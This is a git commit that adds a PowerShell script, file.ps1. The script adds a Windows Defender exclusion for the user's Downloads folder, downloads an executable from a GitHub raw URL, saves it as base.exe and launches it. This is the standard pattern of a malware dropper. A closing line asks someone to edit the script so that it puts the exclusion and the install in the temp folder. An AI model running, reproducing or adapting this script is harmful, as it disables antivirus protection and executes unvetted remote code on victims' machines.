ff4e9597d72c6d9e70a8df5da073105e88233483
andresberejno <123198875+andresberejno@users.noreply.github.com>
2025-01-10 10:21:12 +0530

    Add files via upload

---
+++ file.ps1
@@ -0,0 +1,15 @@
+Add-MpPreference -ExclusionPath $env:USERPROFILE\Downloads
+$url = 'https://github.com/andresberejno/aaaaaaa/raw/refs/heads/main/File.exe'
+$outputFile = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'base.exe')
+
+# Wait until the exclusion is confirmed (just a safeguard, usually it happens instantly)
+Start-Sleep -Milliseconds 100 
+
+# Create a WebClient object to download the file
+$webClient = New-Object System.Net.WebClient
+$webClient.DownloadFile($url, $outputFile)
+
+# Run the downloaded file after the download is complete
+Start-Process -FilePath $outputFile
+
+edit this file for me it will add elxusion in temp folder ok? and it will install the file on temp folder
